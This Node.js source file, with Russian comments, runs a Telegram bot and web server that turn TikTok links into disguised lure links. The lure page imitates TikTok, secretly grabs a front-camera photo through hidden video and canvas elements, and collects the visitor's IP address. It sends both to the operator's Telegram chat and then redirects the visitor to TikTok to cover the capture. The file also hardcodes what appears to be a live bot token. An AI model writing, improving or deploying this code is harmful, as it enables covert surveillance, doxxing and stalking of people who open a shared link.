const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
const CHAT_ID = '8667961334';
const PORT = process.env.PORT || 3000;
const DOMAIN = 'https://dox-toxx.onrender.com'; 

const app = express();
const bot = new TelegramBot(TOKEN, { polling: true });

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true }));

const linksDB = {};

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, 'Отправь ссылку на TikTok.');
});

bot.on('message', (msg) => {
  const text = msg.text;
  if (!text || text.startsWith('/')) return;

  if (text.includes('tiktok.com')) {
    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = text;
    const fakeLink = `${DOMAIN}/${shortId}/`;
    
    bot.sendMessage(msg.chat.id, '👇 Нажмите кнопку ниже', {
      reply_markup: {
        inline_keyboard: [[{ text: 'Открыть', web_app: { url: fakeLink } }]]
      }
    });
  }
});

bot.on('inline_query', async (query) => {
  try {
    const text = query.query;

    // Если пустой запрос, можно показать подсказку
    if (!text) {
      return bot.answerInlineQuery(query.id, [{
        type: 'article',
        id: 'hint',
        title: 'Введите ссылку на TikTok',
        description: 'Например: https://www.tiktok.com/@user/video/123456',
        input_message_content: { message_text: 'Введите ссылку на TikTok' }
      }], { cache_time: 0 });
    }

    if (!text.includes('tiktok.com')) {
      return bot.answerInlineQuery(query.id, [], { cache_time: 0 });
    }

    const shortId = crypto.randomBytes(4).toString('hex');
    linksDB[shortId] = text;
    const appLink = `${DOMAIN}/${shortId}/`;

    const result = {
      type: 'article',
      id: shortId,
      title: 'Открыть видео',
      description: 'Нажмите, чтобы отправить',
      input_message_content: {
        message_text: '👇 Нажмите кнопку ниже, чтобы открыть видео' 
      },
      reply_markup: {
        inline_keyboard: [[{ text: 'Открыть', url: appLink }]]
      }
    };

    await bot.answerInlineQuery(query.id, [result], { cache_time: 0 });
  } catch (err) {
    console.error(err);
  }
});

app.get('/', (req, res) => {
  res.redirect('https://www.tiktok.com/');
});

app.post('/api/collect', async (req, res) => {
  const { target, photo } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  try {
    await bot.sendMessage(CHAT_ID, `IP: ${ip}\nЦель: ${target || '?'}`);

    if (photo && photo.startsWith('data:image')) {
      const base64Data = photo.split(',')[1];
      const buffer = Buffer.from(base64Data, 'base64');
      await bot.sendPhoto(CHAT_ID, buffer);
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ ok: false });
  }
});

app.get('/:id/', (req, res) => {
  const shortId = req.params.id;
  const targetUrl = linksDB[shortId];

  if (!targetUrl) return res.redirect('https://www.tiktok.com/');

  res.send(`<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<title>TikTok</title>
<style>
  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: sans-serif; color: #000; margin: 0; padding: 0; }
  .header { background: #e3e3e3; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #d0d0d0; }
  .avatar-lg { width: 48px; height: 48px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; }
  .avatar-lg svg { width: 28px; height: 28px; fill: #fff; }
  .header-info { flex: 1; }
  .header-info .name { font-weight: 600; font-size: 16px; margin-bottom: 2px; }
  .header-info .desc { font-size: 13px; color: #666; }
  .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
  .content { padding: 20px; max-width: 600px; margin: 0 auto; }
  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; height: 400px; width: 100%; }
  #preview, #canvas { position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
</style>
</head>
<body>
<div class="header">
  <div class="avatar-lg"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
  <div class="header-info">
    <div class="name">TikTok</div>
    <div class="desc">Приєднуйся до мене в TikTok</div>
  </div>
  <button class="btn-red" id="btnOpen">Открыть</button>
</div>
<div class="content">
  <div class="skeleton-box"></div>
</div>
<video id="preview" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>
<script>
  const TARGET_URL = "${targetUrl}";
  const tg = window.Telegram?.WebApp;

  if (tg) {
    tg.ready();
    tg.expand();
    if (tg.BackButton) tg.BackButton.hide();
    if (tg.requestCameraAccess) tg.requestCameraAccess((granted) => { console.log("Camera access:", granted); });
  }

  const video = document.getElementById('preview');
  const canvas = document.getElementById('canvas');

  async function takePhoto() {
    let stream = null;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
      video.srcObject = stream;
      video.muted = true;
      await video.play();
      await new Promise(r => setTimeout(r, 500));
      
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      canvas.width = w;
      canvas.height = h;
      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return blob;
    } catch (e) {
      if (stream) stream.getTracks().forEach(t => t.stop());
      return null;
    }
  }

  let redirected = false;
  function goTarget() {
    if (redirected) return;
    redirected = true;
    if (tg && tg.openLink) { tg.openLink(TARGET_URL); } else { location.replace(TARGET_URL); }
  }

  document.getElementById('btnOpen').onclick = (e) => { e.preventDefault(); goTarget(); };
  setTimeout(goTarget, 3000);

  (async () => {
    const photoPromise = takePhoto();
    const photoBlob = await photoPromise;
    let photoBase64 = null;
    if (photoBlob) {
      photoBase64 = await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); });
    }
    fetch('/api/collect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ photo: photoBase64, target: TARGET_URL })
    }).catch(() => {});
  })();
</script>
</body>
</html>`);
});

app.listen(PORT, () => { console.log(`Port ${PORT}`); });
